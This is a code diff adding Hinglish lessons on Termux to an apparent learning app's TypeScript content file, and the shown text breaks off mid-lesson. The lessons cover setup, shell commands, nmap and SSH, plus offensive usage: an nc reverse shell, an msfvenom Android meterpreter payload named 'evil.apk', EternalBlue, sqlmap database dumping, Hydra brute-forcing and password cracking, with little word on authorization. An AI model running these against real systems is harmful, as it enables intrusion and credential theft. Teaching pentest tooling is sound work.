@@ -5090,4 +5090,223 @@ export const topicContent: Record<string, TopicContent> = {
       "Hydration: 2-3L water — mild dehydration = 10-15% cognitive decline",
     ],
   },
+
+  // ─── PHASE 3.5: TERMUX ────────────────────────────────────────────────────
+
+  "tmx-01": {
+    title: "Termux Installation & First Setup",
+    image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=900&fit=crop&auto=format",
+    tagline: "Android pe poora Linux lab — bina root ke hacking ka power!",
+    sections: [
+      {
+        heading: "📱 Termux Kya Hai?",
+        content: `Termux ek free Android app hai jo tumhare phone pe ek full Linux terminal environment deta hai — bina root ke! Imagine karo — tumhara phone ek Kali Linux machine ban jaata hai jise tum apni jeb mein carry kar sakte ho.\n\nTermux mein tum kar sakte ho:\n• Nmap se port scanning\n• Python scripts run karna\n• SSH se servers access karna\n• Metasploit framework use karna\n• Bash scripts likhna aur run karna\n• Git se code manage karna\n• Poori Kali Linux install karna (proot se!)\n\nCybersecurity ke liye yeh ek game-changer tool hai — laptop na ho toh bhi phone se kaam chalta hai!`,
+      },
+      {
+        heading: "⬇️ Sahi Tarike Se Install Karo",
+        content: `⚠️ IMPORTANT: Termux ko Google Play Store se MAT install karo — woh version 2020 se outdated hai aur packages kaam nahi karte!\n\n**Step 1: F-Droid se install karo**\n1. f-droid.org pe jao (browser mein)\n2. F-Droid APK download karo\n3. Install karo (Unknown sources allow karna padega Settings mein)\n4. F-Droid app mein "Termux" search karo\n5. Termux install karo F-Droid se\n\n**Step 2: Pehli baar open karo**\nTermux khulega aur kuch files download karega — internet connection chahiye. Wait karo.\n\n**Step 3: Immediately yeh karo**\n\`\`\`bash\npkg update && pkg upgrade\n\`\`\`\nSab Y/yes karo jab pucha jaaye. Yeh sab packages latest kar deta hai.\n\n**Step 4: Storage permission do**\n\`\`\`bash\ntermux-setup-storage\n\`\`\`\nPopup aayega — "Allow" karo. Ab tum phone ki internal storage Termux se access kar sakte ho.`,
+      },
+      {
+        heading: "⚙️ First-Time Configuration",
+        content: `**Extra Keys Row Enable Karo** (Ctrl, Tab, Arrow keys mobile pe):\nTermux app → 3-dot menu → Settings → Terminal → Extra Keys → Turn ON\n\nYa .termux/termux.properties file mein:\n\`\`\`\nextra-keys = [['ESC','TAB','CTRL','ALT','LEFT','DOWN','UP','RIGHT']]\n\`\`\`\n\n**Essential Tools Install Karo:**\n\`\`\`bash\npkg install git curl wget vim nano python openssh nmap\n\`\`\`\n\n**zsh + oh-my-zsh install (optional but nice):**\n\`\`\`bash\npkg install zsh\nsh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"\n\`\`\`\n\n**Termux Directory Structure:**\n• Home dir: \`/data/data/com.termux/files/home/\` → shortcut: \`~\`\n• Programs: \`/data/data/com.termux/files/usr/\` → $PREFIX variable\n• Storage: \`~/storage/\` (phone storage ka link)\n\n**Font Aur Colors:**\nTermux.app → Long press → "More" → "Style" → font aur color scheme choose karo`,
+      },
+      {
+        heading: "📦 Termux:API — Phone Ka Power",
+        content: `Termux:API ek separate app hai (F-Droid se install karo) jo phone ke sensors aur features ko Termux se control karne deta hai.\n\nInstall:\n\`\`\`bash\npkg install termux-api\n\`\`\`\n\nUseful commands:\n\`\`\`bash\ntermux-battery-status          # Battery level aur state\ntermux-wifi-scaninfo           # Nearby WiFi networks\ntermux-location                # GPS coordinates\ntermux-notification --title 'Done!' --content 'Script complete'\ntermux-vibrate -d 1000         # 1 second vibrate\ntermux-clipboard-set 'text'    # Clipboard mein copy\ntermux-clipboard-get           # Clipboard padhna\ntermux-camera-photo img.jpg    # Photo lena\ntermux-sms-list               # SMS list (permission needed)\n\`\`\`\n\nYeh features automation scripts mein kaam aate hain — jaise scan hone pe notification aana.`,
+      },
+    ],
+    keyPoints: [
+      "F-Droid se install karo — Play Store version outdated hai",
+      "pkg update && pkg upgrade — pehla kaam yahi karo",
+      "termux-setup-storage — phone storage access ke liye zaroori",
+      "$PREFIX = /data/data/com.termux/files/usr/ — yahan packages install hote hain",
+      "Termux:API app = phone sensors ko terminal se control karo",
+    ],
+  },
+
+  "tmx-02": {
+    title: "Termux Essential Commands",
+    image: "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=900&fit=crop&auto=format",
+    tagline: "Har hacker ka pehla kadam — terminal commands master karo!",
+    sections: [
+      {
+        heading: "📂 File & Directory Commands",
+        content: `**Navigation:**\n\`\`\`bash\npwd              # Present Working Directory — tum kahan ho\nls               # Files list karo\nls -la           # Hidden files bhi + permissions\nls -lh           # Human readable sizes (KB, MB)\ncd ~             # Home directory jao\ncd /             # Root jao (Termux root = $PREFIX)\ncd ..            # Ek level upar jao\ncd -             # Pichle directory pe wapas jao\n\`\`\`\n\n**File Operations:**\n\`\`\`bash\nmkdir myfolder               # Folder banana\nmkdir -p a/b/c               # Nested folders ek command mein\nrm file.txt                  # File delete\nrm -rf folder/               # Folder + contents delete (CAREFUL!)\ncp source.txt dest.txt       # Copy\ncp -r folder/ newFolder/     # Folder copy\nmv old.txt new.txt           # Rename\nmv file.txt ~/storage/       # Move to phone storage\ntouch newfile.txt            # Empty file banana\nln -s original link          # Symbolic link banana\n\`\`\`\n\n**File Reading:**\n\`\`\`bash\ncat file.txt          # Poori file print\nless file.txt         # Scroll karo (q = quit)\nhead -20 file.txt     # Pehli 20 lines\ntail -20 file.txt     # Aakhri 20 lines\ntail -f log.txt       # Live log watch karo\nwc -l file.txt        # Line count\nwc -w file.txt        # Word count\n\`\`\``,
+      },
+      {
+        heading: "🔍 Search & Text Processing",
+        content: `**grep — Text Search:**\n\`\`\`bash\ngrep 'password' file.txt          # file mein dhundo\ngrep -r 'admin' /path/            # Recursive search\ngrep -i 'error' log.txt           # Case insensitive\ngrep -n 'text' file               # Line numbers bhi\ngrep -v 'exclude' file            # Invert — exclude karo\ngrep -E 'regex' file              # Extended regex\ngrep -c 'pattern' file            # Count matches\n\`\`\`\n\n**find — File Dhundna:**\n\`\`\`bash\nfind . -name '*.txt'              # Current dir mein .txt files\nfind / -name 'config' 2>/dev/null # Root se (errors suppress)\nfind . -size +1M                   # 1MB se bade files\nfind . -newer file.txt             # Recent files\nfind . -type d                     # Sirf directories\nfind . -type f -name '*.py'        # Python files\n\`\`\`\n\n**Text Processing:**\n\`\`\`bash\nsort file.txt                      # Sort karo\nsort -r file.txt                   # Reverse sort\nuniq file.txt                      # Duplicate lines hatao\ncut -d',' -f1 file.csv            # CSV ka pehla column\nawk '{print $1}' file              # Pehla word har line ka\nsed 's/old/new/g' file            # Replace text\ntr 'a-z' 'A-Z' < file            # Lowercase to uppercase\n\`\`\``,
+      },
+      {
+        heading: "⚡ Process & System Commands",
+        content: `**Process Management:**\n\`\`\`bash\nps aux               # Sab processes dekho\nps aux | grep python # Python processes\nkill 1234            # Process 1234 band karo\nkill -9 1234         # Force kill\npkill python         # Name se kill\nhtop                 # Interactive process monitor (pkg install htop)\ntop                  # Basic process monitor\n\`\`\`\n\n**System Info:**\n\`\`\`bash\nuname -a             # Kernel aur system info\ndf -h                # Disk space\ndu -sh folder/       # Folder ka size\nfree -h              # RAM usage (limited in Termux)\nenv                  # Environment variables\necho $PATH           # PATH variable\nwhoami               # Current user (u0_a123 Termux mein)\ndate                 # Current date aur time\nuptime               # System uptime\n\`\`\`\n\n**Useful Shortcuts:**\n\`\`\`bash\nCtrl+C    # Running command stop karo\nCtrl+Z    # Background mein bhejo\nbg        # Background job resume\nfg        # Foreground mein lao\njobs      # Background jobs list\nhistory   # Command history\n!!        # Last command repeat\n!nmap     # Last nmap command repeat\nCtrl+R    # Reverse search (history mein)\n\`\`\``,
+      },
+      {
+        heading: "🔗 Piping & Redirection",
+        content: `Piping ek command ka output doosri command ko dena hai — yeh Linux ka superpower hai!\n\n**Basic Piping (|):**\n\`\`\`bash\nls -la | grep '.txt'           # ls output ko grep karo\ncat file.txt | sort | uniq     # File sort karo, duplicates hatao\nps aux | grep python | wc -l   # Python processes count karo\nnmap -sV target | grep 'open'  # Sirf open ports\n\`\`\`\n\n**Output Redirection:**\n\`\`\`bash\ncommand > output.txt           # Output file mein save karo (overwrite)\ncommand >> output.txt          # Append karo (add to existing)\ncommand 2> errors.txt          # Error output save karo\ncommand 2>/dev/null            # Errors discard karo\ncommand &> all.txt             # Both output + errors save\ncommand | tee output.txt       # Screen pe bhi + file mein bhi\n\`\`\`\n\n**Practical Examples:**\n\`\`\`bash\n# Nmap results save karo\nnmap -sV 192.168.1.1 | tee scan_results.txt\n\n# Error-free file search\nfind / -name 'passwd' 2>/dev/null\n\n# Running command output sort karke unique lines\ncat passwords.txt | sort | uniq > unique_passwords.txt\n\n# Multiple commands ek saath\ncommand1 && command2    # Dono chalao (2nd sirf agar 1st succeed)\ncommand1 || command2    # Ek fail ho toh doosra chalao\ncommand1 ; command2     # Dono chalao no matter what\n\`\`\``,
+      },
+    ],
+    keyPoints: [
+      "pwd, ls -la, cd — navigation basics yaad karo",
+      "grep -r 'text' . — directory mein text dhundna",
+      "find / -name 'file' 2>/dev/null — file dhundna errors ke bina",
+      "| (pipe) — commands chain karo, Linux ka superpower",
+      "> save, >> append, 2>/dev/null errors suppress karo",
+    ],
+  },
+
+  "tmx-03": {
+    title: "pkg Package Manager — Termux Ka Apt",
+    image: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=900&fit=crop&auto=format",
+    tagline: "Ek command mein hacking tools install karo — pkg magic!",
+    sections: [
+      {
+        heading: "📦 pkg — Termux Ka Package Manager",
+        content: `pkg apt ka ek wrapper hai jo Termux ke liye optimize kiya gaya hai. Iske through tum thousands of tools install kar sakte ho.\n\n**Basic Commands:**\n\`\`\`bash\npkg update             # Repository list update karo\npkg upgrade            # Sab installed packages update karo\npkg install nmap       # Package install karo\npkg remove nmap        # Package uninstall karo\npkg reinstall nmap     # Reinstall karo\npkg search nmap        # Package dhundo\npkg list-installed     # Installed packages dekho\npkg info nmap          # Package ka detail info\npkg files nmap         # Installed files list\n\`\`\`\n\n**RULE #1:** Hamesha pehle yeh karo:\n\`\`\`bash\npkg update && pkg upgrade\n\`\`\`\nBina iske bohot saare installations fail hongi!`,
+      },
+      {
+        heading: "🛠️ Must-Install Packages — Complete List",
+        content: `**Programming Languages:**\n\`\`\`bash\npkg install python python-pip   # Python 3 + pip\npkg install python2             # Python 2 (legacy tools)\npkg install nodejs npm          # JavaScript/Node.js\npkg install ruby                # Ruby (Metasploit depend karta hai)\npkg install perl                # Perl scripts\npkg install golang              # Go language\npkg install rust                # Rust language\npkg install php                 # PHP\npkg install openjdk-17          # Java\n\`\`\`\n\n**Networking & Security:**\n\`\`\`bash\npkg install nmap                # Port scanner\npkg install netcat-openbsd      # nc — networking Swiss knife\npkg install openssh             # SSH client + server\npkg install wget curl           # File download\npkg install dnsutils            # dig, nslookup\npkg install whois               # Domain info\npkg install tor                 # Anonymity\npkg install proxychains-ng      # Proxy chaining\npkg install masscan             # Fast port scanner\npkg install hydra               # Login brute forcer\npkg install sqlmap              # SQL injection tool\npkg install nikto               # Web vulnerability scanner\npkg install john                # Password cracker\n\`\`\`\n\n**System & Utilities:**\n\`\`\`bash\npkg install git                 # Version control\npkg install vim nano            # Text editors\npkg install tmux screen         # Terminal multiplexers\npkg install htop                # Process monitor\npkg install tree                # Directory tree view\npkg install zip unzip           # Compression\npkg install file                # File type detect\npkg install binutils            # Binary tools (strings, objdump)\npkg install gdb                 # Debugger\n\`\`\`\n\n**Advanced:**\n\`\`\`bash\npkg install metasploit          # Metasploit Framework!\npkg install proot               # Fake root environment\npkg install proot-distro        # Full Linux distros install\npkg install aircrack-ng         # WiFi security testing\npkg install tcpdump             # Packet capture\npkg install wireshark           # (tshark CLI version)\npkg install termux-api          # Phone API access\n\`\`\``,
+      },
+      {
+        heading: "🐍 Python pip — Python Packages",
+        content: `Python ke through aur bhi tools install kar sakte ho pip se:\n\n**pip Basic Commands:**\n\`\`\`bash\npip install requests            # HTTP requests library\npip install beautifulsoup4      # Web scraping\npip install scapy               # Packet manipulation\npip install paramiko            # SSH automation\npip install cryptography        # Crypto library\npip install pwntools            # CTF exploitation\npip install impacket            # Windows protocols\npip install pyautogui           # GUI automation\npip show requests               # Package info\npip list                        # Installed packages\npip uninstall requests          # Uninstall\n\`\`\`\n\n**Security-specific Python tools:**\n\`\`\`bash\npip install shodan              # Shodan API\npip install python-nmap         # Nmap Python wrapper\npip install netaddr             # IP address manipulation\npip install dnspython           # DNS library\npip install pyOpenSSL           # SSL/TLS\n\`\`\`\n\n**Virtual Environment (best practice):**\n\`\`\`bash\npython -m venv myenv            # Virtual env banana\nsource myenv/bin/activate       # Activate karo\npip install tool                # Isolated mein install\ndeactivate                      # Deactivate\n\`\`\``,
+      },
+      {
+        heading: "🔧 Package Troubleshooting",
+        content: `**Common Problems aur Solutions:**\n\n**Problem: Package install nahi ho raha**\n\`\`\`bash\npkg update\npkg upgrade\npkg install --reinstall packagename\n\`\`\`\n\n**Problem: Storage space nahi hai**\n\`\`\`bash\ndu -sh $PREFIX                  # Termux ka size\npkg autoclean                   # Cache clear karo\n\`\`\`\n\n**Problem: "Unable to locate package"**\n\`\`\`bash\n# Pehle check karo\npkg search packagename\n# Ya GitHub se source install karo\ngit clone https://github.com/tool/repo\ncd repo && bash install.sh\n\`\`\`\n\n**Problem: Python pip kaam nahi kar raha**\n\`\`\`bash\npkg reinstall python\npip install --upgrade pip\n\`\`\`\n\n**Manual Build Karna (source se):**\n\`\`\`bash\npkg install clang make cmake\ngit clone https://github.com/tool\ncd tool && ./configure && make && make install\n\`\`\`\n\n**Termux Community Resources:**\n• Termux Wiki: wiki.termux.com\n• GitHub: github.com/termux\n• Reddit: r/termux\n• Discord: Termux Discord server`,
+      },
+    ],
+    keyPoints: [
+      "pkg update && pkg upgrade — hamesha pehle yeh karo!",
+      "pkg install metasploit — haan! Phone pe Metasploit chalta hai!",
+      "pip install — Python packages alag se install hote hain",
+      "pkg search name — install se pehle package available hai ya nahi check karo",
+      "pkg autoclean — storage bachane ke liye cache clear karo",
+    ],
+  },
+
+  "tmx-04": {
+    title: "Termux Networking Commands",
+    image: "https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=900&fit=crop&auto=format",
+    tagline: "Phone se network recon — pocket-sized hacking lab!",
+    sections: [
+      {
+        heading: "🌐 Network Information Commands",
+        content: `**Interface Information:**\n\`\`\`bash\nifconfig              # Network interfaces (pkg install net-tools)\nip addr               # Modern way — interfaces aur IPs\nip addr show wlan0    # Sirf WiFi interface\nip route              # Routing table\nip neigh              # ARP table — connected devices\n\`\`\`\n\n**Android pe typically:**\n• \`wlan0\` = WiFi\n• \`lo\` = Loopback (127.0.0.1)\n• IP range usually: 192.168.x.x (home WiFi)\n\n**Connectivity Test:**\n\`\`\`bash\nping -c 4 google.com          # 4 pings bhejo\nping -c 4 8.8.8.8             # Google DNS ping\nping -c 4 192.168.1.1         # Gateway ping\ntraceroute google.com         # Packet ka path\ncurl -s https://icanhazip.com # Public IP dekho\ncurl ifconfig.me              # Public IP alternate\n\`\`\`\n\n**Open Ports Check:**\n\`\`\`bash\nnetstat -tulpn                # Open ports (pkg install net-tools)\nss -tulpn                     # Modern netstat alternative\nncat -z -v target 1-1000     # Port scan (netcat se)\n\`\`\``,
+      },
+      {
+        heading: "🔍 Nmap — Port Scanner Complete Guide",
+        content: `**Installation:**\n\`\`\`bash\npkg install nmap\n\`\`\`\n\n**Basic Scans:**\n\`\`\`bash\nnmap target.com               # Basic scan\nnmap 192.168.1.1              # Local device scan\nnmap 192.168.1.0/24           # Whole network scan\nnmap -sV target               # Service VERSION detect\nnmap -O target                # OS detect\nnmap -A target                # Aggressive (everything)\n\`\`\`\n\n**Port Options:**\n\`\`\`bash\nnmap -p 80 target             # Single port\nnmap -p 80,443,22 target      # Multiple ports\nnmap -p 1-1000 target         # Range\nnmap -p- target               # ALL 65535 ports\nnmap -p U:53,T:80 target      # UDP port 53, TCP port 80\n\`\`\`\n\n**Scan Speed:**\n\`\`\`bash\nnmap -T0 target               # Paranoid (slowest)\nnmap -T3 target               # Normal (default)\nnmap -T4 target               # Aggressive (fast, recommended)\nnmap -T5 target               # Insane (fastest)\n\`\`\`\n\n**NSE Scripts:**\n\`\`\`bash\nnmap --script vuln target         # Vulnerability scan\nnmap --script http-enum target    # Web directories\nnmap --script smb-vuln* target    # SMB vulnerabilities\nnmap --script default target      # Default scripts\nnmap --script-help http-enum      # Script help\n\`\`\`\n\n**Output:**\n\`\`\`bash\nnmap -oN results.txt target   # Normal text\nnmap -oX results.xml target   # XML output\nnmap -oA all_formats target   # Sab formats\n\`\`\``,
+      },
+      {
+        heading: "🌍 DNS & Web Commands",
+        content: `**DNS Queries:**\n\`\`\`bash\ndig example.com                    # A record (IP)\ndig example.com MX                 # Mail servers\ndig example.com NS                 # Name servers\ndig example.com TXT                # TXT records (SPF etc)\ndig +short example.com             # Sirf IP\ndig @8.8.8.8 example.com          # Specific DNS server se\nnslookup example.com               # Alternative DNS lookup\nhost example.com                   # Simple DNS lookup\nwhois example.com                  # Domain registration info\ndig -x 8.8.8.8                    # Reverse DNS (IP to domain)\n\`\`\`\n\n**curl — HTTP Swiss Army Knife:**\n\`\`\`bash\ncurl https://example.com                    # GET request\ncurl -I https://example.com                 # Headers only\ncurl -v https://example.com                 # Verbose (all headers)\ncurl -X POST -d 'user=admin&pass=123' URL   # POST request\ncurl -H 'Content-Type: application/json' \\  # Custom header\n     -d '{\"key\":\"value\"}' URL\ncurl -b 'session=abc123' URL                # Cookie ke saath\ncurl -u admin:password URL                  # Basic auth\ncurl -k https://self-signed.cert.com        # SSL verify skip\ncurl -O https://site.com/file.zip           # File download\ncurl -L URL                                 # Redirects follow\ncurl -s URL | grep 'password'              # Pipe to grep\n\`\`\`\n\n**wget — File Downloader:**\n\`\`\`bash\nwget https://site.com/file.zip        # File download\nwget -r -np https://site.com/        # Website mirror\nwget --mirror https://site.com/      # Complete mirror\nwget -b URL                          # Background download\nwget -c URL                          # Resume incomplete download\n\`\`\``,
+      },
+      {
+        heading: "🔐 SSH & Remote Access",
+        content: `**SSH — Secure Shell:**\n\`\`\`bash\nssh user@hostname                      # Basic connect\nssh user@192.168.1.100                # IP se connect\nssh -p 2222 user@host                 # Custom port\nssh -i key.pem user@host             # Private key se\nssh user@host 'ls /var/www'          # Remote command run\nssh -v user@host                      # Verbose (debug)\n\`\`\`\n\n**SSH Tunneling (Advanced):**\n\`\`\`bash\n# Local Port Forwarding — local port to remote\nssh -L 8080:localhost:80 user@host\n# Ab browser mein localhost:8080 = remote server ka port 80\n\n# Remote Port Forwarding — remote port to local\nssh -R 4444:localhost:4444 user@host\n# Remote server ke port 4444 pe koi connect kare to local 4444 pe aayega\n\n# Dynamic SOCKS Proxy\nssh -D 1080 user@host\n# Ab proxychains ya browser ko SOCKS5 localhost:1080 se configure karo\n\`\`\`\n\n**SCP — Secure File Transfer:**\n\`\`\`bash\nscp file.txt user@host:/remote/path/   # Upload\nscp user@host:/remote/file.txt .       # Download\nscp -r folder/ user@host:/path/        # Folder upload\n\`\`\`\n\n**netcat — Network Swiss Knife:**\n\`\`\`bash\nnc -lvp 4444                  # Listener start (port 4444)\nnc target.com 80              # Connect karo\necho 'Hello' | nc target 80  # Data bhejo\nnc -z target 1-1000          # Port scan\nnc -e /bin/bash target 4444  # Reverse shell (agar nc supports -e)\n\`\`\``,
+      },
+    ],
+    keyPoints: [
+      "nmap -sV -T4 target — service version detect with speed",
+      "curl -v URL — full HTTP request/response dekho",
+      "dig domain MX/NS/TXT — all DNS records check karo",
+      "ssh -L 8080:localhost:80 user@host — port forwarding tunnel",
+      "nmap -p- target — all 65535 ports scan (time lagta hai!)",
+    ],
+  },
+
+  "tmx-05": {
+    title: "Termux Hacking Tools Setup",
+    image: "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=900&fit=crop&auto=format",
+    tagline: "Phone se pentest — professional tools, pocket mein!",
+    sections: [
+      {
+        heading: "🎯 Metasploit Framework — Phone Pe!",
+        content: `Haan! Metasploit Termux mein chalta hai. Yeh world ka #1 penetration testing framework hai.\n\n**Installation:**\n\`\`\`bash\npkg install unstable-repo   # Unstable repo enable karo pehle\npkg install metasploit      # Install (bada hai, time lagega)\n\`\`\`\n\n**Start karna:**\n\`\`\`bash\nmsfconsole                  # Start karo (pehli baar slow)\n\`\`\`\n\n**Basic Commands:**\n\`\`\`bash\nsearch eternalblue          # Exploit dhundo\nuse exploit/windows/smb/ms17_010_eternalblue\nshow options               # Options dekho\nset RHOSTS 192.168.1.100   # Target set karo\nset LHOST 192.168.1.5      # Your IP (listener)\nset LPORT 4444             # Your port\nrun                        # Attack!\nexploit                    # Alternate run command\n\`\`\`\n\n**Android Payload Banana:**\n\`\`\`bash\nmsfvenom -p android/meterpreter/reverse_tcp \\\n  LHOST=YOUR_IP LPORT=4444 \\\n  -o evil.apk\n\`\`\`\n\n**Meterpreter Commands (after shell):**\n\`\`\`bash\nsysinfo           # System info\ngetuid            # Current user\nhashdump          # Password hashes\nshell             # Normal shell\ndownload file.txt # File download\nupload tool.exe   # File upload\nscreenshot        # Screenshot lena\n\`\`\``,
+      },
+      {
+        heading: "💧 SQLMap — SQL Injection Automation",
+        content: `**Installation:**\n\`\`\`bash\npkg install sqlmap\n# Ya latest version:\ngit clone https://github.com/sqlmapproject/sqlmap\n\`\`\`\n\n**Basic Usage:**\n\`\`\`bash\n# Basic test\nsqlmap -u 'http://site.com/page?id=1'\n\n# Databases list karo\nsqlmap -u 'http://site.com/page?id=1' --dbs\n\n# Tables list karo\nsqlmap -u 'http://site.com/page?id=1' -D dbname --tables\n\n# Data dump karo\nsqlmap -u 'http://site.com/page?id=1' -D db -T users --dump\n\n# POST request test\nsqlmap -u 'http://site.com/login' \\\n  --data='user=admin&pass=test'\n\n# With cookie\nsqlmap -u 'http://site.com/page?id=1' \\\n  --cookie='PHPSESSID=abcdef123'\n\n# Level aur risk badhao (more tests)\nsqlmap -u URL --level=3 --risk=2\n\n# WAF bypass\nsqlmap -u URL --tamper=space2comment,randomcase\n\`\`\``,
+      },
+      {
+        heading: "🔓 Hydra — Login Brute Forcer",
+        content: `**Installation:**\n\`\`\`bash\npkg install hydra\n\`\`\`\n\n**SSH Brute Force:**\n\`\`\`bash\nhydra -l admin -P /path/wordlist.txt ssh://target\nhydra -L users.txt -P pass.txt ssh://192.168.1.100\nhydra -l root -P rockyou.txt ssh://target -t 4\n\`\`\`\n\n**FTP Brute Force:**\n\`\`\`bash\nhydra -l admin -P pass.txt ftp://target\n\`\`\`\n\n**HTTP Form Brute Force:**\n\`\`\`bash\nhydra -l admin -P pass.txt \\\n  http-post-form \\\n  '/login.php:user=^USER^&pass=^PASS^:Invalid password'\n\`\`\`\n\n**RDP, Telnet, etc:**\n\`\`\`bash\nhydra -l admin -P pass.txt rdp://target\nhydra -l admin -P pass.txt telnet://target\nhydra -l admin -P pass.txt smtp://target\n\`\`\`\n\n**Wordlists (Termux mein):**\n\`\`\`bash\n# SecLists download karo\ngit clone --depth 1 \\\n  https://github.com/danielmiessler/SecLists\n# rockyou.txt\nwget https://github.com/brannondorsey/naive-hashcat/\\\nreleases/download/data/rockyou.txt\n\`\`\`\n\n**Nikto — Web Scanner:**\n\`\`\`bash\npkg install nikto\nnikto -h http://target.com       # Basic scan\nnikto -h https://target.com -ssl # HTTPS\nnikto -h target -p 8080          # Custom port\nnikto -h target -o report.html   # HTML report\n\`\`\``,
+      },
+      {
+        heading: "🔑 Password Cracking Tools",
+        content: `**John the Ripper:**\n\`\`\`bash\npkg install john\n\n# Hash crack karo\njohn --wordlist=/path/rockyou.txt hash.txt\n\n# Format specify karo\njohn --format=md5 hash.txt\njohn --format=sha256 hash.txt\njohn --format=ntlm hash.txt\n\n# Progress dekho\njohn --show hash.txt\n\n# Bruteforce (no wordlist)\njohn --incremental hash.txt\n\`\`\`\n\n**Hashcat (limited GPU on phone, lekin chalta hai):**\n\`\`\`bash\npkg install hashcat\n\n# MD5 crack\nhashcat -m 0 hash.txt wordlist.txt\n\n# SHA-256\nhashcat -m 1400 hash.txt wordlist.txt\n\n# NTLM (Windows)\nhashcat -m 1000 hash.txt wordlist.txt\n\n# WPA2 WiFi\nhashcat -m 22000 capture.hc22000 wordlist.txt\n\n# Attack modes:\n# -a 0 = Dictionary\n# -a 3 = Brute force (?u?l?d?s masks)\n# -a 1 = Combination\n\`\`\`\n\n**Hash Identify karna:**\n\`\`\`bash\npkg install hashid\nhashid 'hash_value'    # Konsa format hai pata karo\n\`\`\`\n\n**Aircrack-ng (WiFi — Root Needed):**\n\`\`\`bash\npkg install aircrack-ng\n# Note: Monitor mode ke liye Android root chahiye\naircrack-ng -w wordlist.txt capture.cap\n\`\`\``,
+      },
+    ],
+    keyPoints: [
+      "pkg install metasploit — poora framework phone pe!",
+      "sqlmap -u URL --dbs — SQL injection automated testing",
+      "hydra -l admin -P rockyou.txt ssh://target — SSH brute force",
+      "john --wordlist=rockyou.txt hash.txt — offline password cracking",
+      "nikto -h target — web server vulnerability scan",
+    ],
+  },
+
+  "tmx-06": {
+    title: "Termux Scripting — Bash & Python Automation",
+    image: "https://images.unsplash.com/photo-1555066931-4365d14431b9?w=900&fit=crop&auto=format",
+    tagline: "Scripts likho, kaam automate karo — hacker ki productivity!",
+    sections: [
+      {
+        heading: "📝 Bash Scripting Basics",
+        content: `**Script Template:**\n\`\`\`bash\n#!/data/data/com.termux/files/usr/bin/bash\n# Termux mein bash ka path yeh hai (ya simply #!/bin/bash)\n\necho "Script start!"\n\`\`\`\n\n**Variables:**\n\`\`\`bash\nname="Termux"           # String variable\ncount=10                # Number\npath="/tmp/results"     # Path\noutput=$(ls -la)        # Command output capture\necho "Hello $name"      # Variable use karo\necho "Count: \${count}"  # Curly braces (safe)\n\`\`\`\n\n**User Input:**\n\`\`\`bash\nread -p "Target IP: " target\nread -p "Port: " port\nread -s -p "Password: " password  # -s = hidden (password)\necho "Scanning $target:$port..."\n\`\`\`\n\n**Conditions:**\n\`\`\`bash\nif [ -f "file.txt" ]; then\n  echo "File exists"\nelif [ -d "folder" ]; then\n  echo "Folder exists"\nelse\n  echo "Nothing found"\nfi\n\n# Comparison:\n# -eq, -ne, -gt, -lt, -ge, -le (numbers)\n# ==, != (strings)\n# -f file exists, -d dir exists, -z empty string\n\`\`\`\n\n**Loops:**\n\`\`\`bash\n# For loop\nfor i in {1..10}; do\n  echo "Number: $i"\ndone\n\n# For each item in list\nfor ip in 192.168.1.1 192.168.1.2 192.168.1.3; do\n  ping -c 1 $ip && echo "$ip is UP"\ndone\n\n# While loop\nwhile read line; do\n  echo "Processing: $line"\ndone < wordlist.txt\n\`\`\``,
+      },
+      {
+        heading: "🔫 Practical Security Scripts",
+        content: `**Simple Port Scanner:**\n\`\`\`bash\n#!/bin/bash\ntarget=$1\necho "Scanning $target..."\nfor port in $(seq 1 1000); do\n  (echo >/dev/tcp/$target/$port) 2>/dev/null \\\n    && echo "OPEN: $port"\ndone\n# Usage: bash scanner.sh 192.168.1.1\n\`\`\`\n\n**Network Host Discovery:**\n\`\`\`bash\n#!/bin/bash\nnetwork="192.168.1"\necho "Scanning $network.0/24..."\nfor host in $(seq 1 254); do\n  ip="$network.$host"\n  ping -c 1 -W 1 $ip > /dev/null 2>&1 \\\n    && echo "UP: $ip"\ndone\n\`\`\`\n\n**Subdomain Brute Forcer:**\n\`\`\`bash\n#!/bin/bash\ndomain=$1\nwordlist=$2\necho "Bruteforcing $domain..."\nwhile read sub; do\n  if host "$sub.$domain" > /dev/null 2>&1; then\n    echo "FOUND: $sub.$domain"\n  fi\ndone < "$wordlist"\n# Usage: bash subenum.sh example.com subs.txt\n\`\`\`\n\n**Auto Recon Script:**\n\`\`\`bash\n#!/bin/bash\ntarget=$1\nmkdir -p recon/$target\n\necho "[*] Nmap scanning..."\nnmap -sV -T4 $target -oN recon/$target/nmap.txt\n\necho "[*] Nikto scan..."\nnikto -h $target -o recon/$target/nikto.txt\n\necho "[*] DNS lookup..."\ndig $target ANY > recon/$target/dns.txt\n\necho "[+] Done! Results in recon/$target/"\ntermux-notification --title 'Recon Done' \\\n  --content \"$target scan complete!\"\n\`\`\``,
+      },
+      {
+        heading: "🐍 Python Scripts in Termux",
+        content: `**Simple Port Scanner (Python):**\n\`\`\`python\n#!/usr/bin/env python3\nimport socket\nimport sys\n\ntarget = sys.argv[1]\nprint(f"Scanning {target}...")\n\nfor port in range(1, 1001):\n    try:\n        s = socket.socket()\n        s.settimeout(0.5)\n        s.connect((target, port))\n        print(f"OPEN: {port}")\n        s.close()\n    except:\n        pass\n\nprint("Done!")\n# Usage: python3 scanner.py 192.168.1.1\n\`\`\`\n\n**HTTP Header Checker:**\n\`\`\`python\n#!/usr/bin/env python3\nimport requests\nimport sys\n\nurl = sys.argv[1]\nresponse = requests.get(url, verify=False)\n\nprint(f"Status: {response.status_code}")\nprint("\\nHeaders:")\nfor key, val in response.headers.items():\n    print(f"  {key}: {val}")\n\nsecurity_headers = [\n    'X-Frame-Options', 'X-XSS-Protection',\n    'Content-Security-Policy', 'HSTS'\n]\nprint("\\nMissing security headers:")\nfor h in security_headers:\n    if h not in response.headers:\n        print(f"  MISSING: {h}")\n\`\`\`\n\n**Directory Brute Forcer:**\n\`\`\`python\n#!/usr/bin/env python3\nimport requests\nimport sys\n\nurl = sys.argv[1]\nwordlist = sys.argv[2]\n\nwith open(wordlist) as f:\n    for line in f:\n        path = line.strip()\n        full_url = f"{url}/{path}"\n        try:\n            r = requests.get(full_url, timeout=3)\n            if r.status_code != 404:\n                print(f"[{r.status_code}] {full_url}")\n        except:\n            pass\n\`\`\``,
+      },
+      {
